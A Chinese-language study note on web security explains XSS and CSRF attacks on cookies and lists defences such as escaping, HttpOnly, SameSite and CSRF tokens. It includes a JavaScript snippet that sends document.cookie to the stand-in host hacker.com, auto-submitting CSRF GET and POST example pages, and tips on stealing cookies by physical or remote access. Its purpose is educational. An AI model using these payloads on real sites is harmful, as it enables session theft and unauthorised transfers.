# Web 安全

## XSS
为了避免跟 CSS 的缩写混淆，Cross-Site Script 的缩写是 XSS。它是通过一些手段在受害者的网页上植入一些 JS 脚本，然后执行后续攻击逻辑 (如：修改 DOM 将黑客自己的收款码贴上来、获取 Cookie 并发送到黑客的服务器等等)。

XSS 攻击分为 3 种：存储型、反射型、DOM 型。前两个是后端的锅，第三个是前端的锅。最主要的防范方法就是前后端都要对那些会被插入到 HTML 中的内容做特殊字符转义。

其它内容自己看参考资料，我这里没必要重复写一遍。

## CSRF
CSRF 攻击分为：GET 类型、POST 类型、链接类型。

CSRF 攻击一般需要受害者已经登录过目标站点 (保存过 Cookie)，否则一般造不成什么损失，所以我们在 Cookie 章节细讲。

其它内容自己看参考资料，我这里没必要重复写一遍。

## Cookie
我们会将用户身份标识信息 (看起来是很长的一串乱码) 放在 Cookie 当中，HTTP 请求发送给服务器后，服务器根据 Cookie 是否正确来判断身份。所以 Cookie 就成了重点攻防目标，对此主要有两种攻击思路。
- 窃取 Cookie，然后黑客就能伪装成用户进行转账操作
- 不窃取 Cookie，通过 CSRF 让用户在不知情的情况下发起转账的 HTTP 请求

窃取 Cookie 的笨办法：
- 可以直接把用户电脑偷偷拿出来，打开浏览器进入淘宝，然后在开发者工具中可以查看网站的 Cookie，把这个 Cookie 复制出来，最后把电脑偷偷放回去
- 找一些借口 (如：维修电脑)，用 QQ 远程桌面控制等方法远程控制用户的电脑，然后打开浏览器将 Cookie 复制出来

### XSS 窃取 Cookie
通过 XSS 漏洞注入下面这样的 JS 脚本。

```javascript
var cookie = document.cookie;  // 1. 获取 Cookie 信息
var xhr = new XMLHttpRequest();
xhr.open('http://hacker.com?cookie=' + cookie);  // 2. 将 Cookie 信息发送到黑客服务器
xhr.send();
```

### CSRF 无需窃取 Cookie
假设 A 站点是黑客的网站，黑客诱导用户进入 A 网站，然后 A 站点会给 B 站点发送 HTTP 请求。比如说 B 站点的转账接口是这样的：`b.com/withdraw?account=bob&amount=10000&for=mallory`。A 站只要给这个 URL 发送 HTTP 请求，浏览器会带上受害者的 Cookie，就攻击成功了。

A 站点可以这样设计来自动发起 CSRF GET 请求：
```html
<html>
<body>
    <img src="http://b.com/withdraw?account=bob&amount=10000&for=mallory" />
</body>
</html>
```

A 站点也可以这样设计来自动发起 CSRF POST 请求：
```html
<html>
<body>
  <form id='hacker-form' action="http://b.com/pay" method=POST>
    <input type="hidden" name="account" value="bob" />
    <input type="hidden" name="amount" value="10000" />
    <input type="hidden" name="for" value="mallory" />
  </form>
  <script> document.getElementById('hacker-form').submit(); </script>
</body>
</html>
```

### Cookie 攻防总结
XSS 攻击的防范：
- 最好前后端都对 `<script>` 做过滤或转义，避免留下 XSS 漏洞
- 给敏感的 Cookie 加上 HttpOnly 属性，不敏感的不需要加以便简化开发

CSRF 攻击的防范：
- Cookie 加上 SameSite 属性
- 服务器验证 HTTP 请求头中的 Referer、Origin 字段，验证请求发起的来源
- 使用 CSRF Token

其它注意：
- 特别敏感的操作要进行二次验证 (如短信验证码)

## 参考资料
这里给的参考资料都是好啃的，一定要自己去看，对于网上已经整理的很好的知识，我不会再写一遍。

- 美团技术团队的：[前端安全系列（一）：如何防止XSS攻击？](https://tech.meituan.com/2018/09/27/fe-security.html)
- 美团技术团队的：[前端安全系列（二）：如何防止CSRF攻击？](https://tech.meituan.com/2018/10/11/fe-security-csrf.html)
- MDN 的文档: [HTTP cookies](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies)
